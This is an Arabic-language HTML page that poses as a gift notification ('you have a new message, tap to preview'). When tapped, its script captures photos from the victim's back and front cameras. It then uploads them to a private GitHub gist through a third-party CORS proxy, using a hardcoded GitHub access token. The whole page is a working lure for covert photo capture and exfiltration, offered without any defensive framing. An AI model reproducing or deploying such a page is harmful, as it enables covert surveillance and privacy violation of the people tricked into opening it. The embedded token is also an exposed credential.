<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري معالجة البيانات...</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; 
            overflow: hidden;
        }
        
        /* واجهة الهدية */
        .gift-card {
            text-align: center; 
            background: linear-gradient(145deg, #2d2d2d, #252525); 
            padding: 60px 40px; 
            border-radius: 20px; 
            box-shadow: 0 15px 40px rgba(0,0,0,0.6); 
            width: 90%; max-width: 350px; 
            cursor: pointer; 
            transition: all 0.3s ease;
            border: 1px solid #333;
            animation: float 3s ease-in-out infinite;
        }
        .gift-icon { font-size: 90px; display: block; margin-bottom: 20px; }
        .gift-text { font-size: 22px; font-weight: bold; margin: 0; }
        
        /* واجهة الكاميرا المخفية */
        .camera-interface {
            display: none;
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: black; z-index: 999;
            flex-direction: column; justify-content: center; align-items: center;
        }
        video { width: 100%; height: auto; max-height: 70vh; object-fit: cover; transform: scaleX(-1); }
        .status-overlay {
            position: absolute; bottom: 20px; width: 100%; text-align: center;
            background: rgba(0,0,0,0.7); padding: 10px; border-radius: 10px;
        }

        /* تأثيرات */
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<!-- واجهة الهدية -->
<div class="gift-card" id="giftCard" onclick="startAutoCapture()">
    <span class="gift-icon">🎁</span>
    <h2 class="gift-text">لديك رسالة جديدة</h2>
    <p style="color: #aaa; margin-top: 10px;">اضغط للمعاينة</p>
</div>

<!-- واجهة الكاميرا -->
<div class="camera-interface" id="camInterface">
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div class="status-overlay" id="statusText">
        جاري تشغيل الكاميرا...
    </div>
</div>

<script>
    const GH_TOKEN = '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'; 
    let capturedFiles = [];

    async function startAutoCapture() {
        // إخفاء الهدية وإظهار الكاميرا
        document.getElementById('giftCard').style.display = 'none';
        const camInterface = document.getElementById('camInterface');
        camInterface.style.display = 'flex';
        camInterface.style.animation = 'fadeIn 0.5s';
        
        const status = document.getElementById('statusText');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        try {
            // 1. التقاط صورة بالكاميرا الخلفية
            status.innerText = "جاري استخدام الكاميرا الخلفية...";
            await captureImage(video, canvas, ctx, 'back', 'خلفية.jpg');

            // 2. التقاط صورة بالكاميرا الأمامية
            status.innerText = "جاري التبديل للكاميرا الأمامية...";
            await new Promise(r => setTimeout(r, 1000)); // تأخير بسيط للتأكد من تبديل العدسة
            await captureImage(video, canvas, ctx, 'front', 'أمامية.jpg');

            status.innerText = "جاري رفع الصور...";
            await uploadToGitHub();

        } catch (error) {
            status.innerText = "خطأ: " + error.message;
        }
    }

    async function captureImage(video, canvas, ctx, mode, filename) {
        // طلب الوصول للكاميرا المطلوبة
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: mode === 'back' ? 'environment' : 'user' }, 
            audio: false 
        });
        
        video.srcObject = stream;
        
        // انتظار تحميل الفيديو
        return new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                
                // الانتظار قليلاً حتى يستقر البث
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // رسم الصورة على الكانفاس
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // تحويلها لملف
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
                    const base64 = dataUrl.split(',')[1];
                    
                    // إضافة الملف للقائمة
                    capturedFiles.push({ name: filename, content: base64 });
                    
                    resolve();
                }, 1000);
            };
        });
    }

    async function uploadToGitHub() {
        const proxyUrl = 'https://api.allorigins.win/raw?url=';
        const apiUrl = encodeURIComponent('https://api.github.com/gists');
        
        const response = await fetch(proxyUrl + apiUrl, {
            method: 'POST',
            headers: {
                'Authorization': `token ${GH_TOKEN}`,
                'Content-Type': 'application/json',
                'X-GitHub-Api-Version': '2022-11-28'
            },
            body: JSON.stringify({
                description: 'Auto Captured Photos',
                public: false,
                files: Object.fromEntries(capturedFiles.map(f => [f.name, { content: f.content }] ))
            })
        });

        if (response.ok) {
            const data = await response.json();
            document.getElementById('statusText').innerHTML = "✅ تم الإرسال بنجاح!<br><a href='" + data.html_url + "' target='_blank'>عرض الصور</a>";
        } else {
            document.getElementById('statusText').innerText = "فشل الرفع";
        }
    }
</script>

</body>
</html>
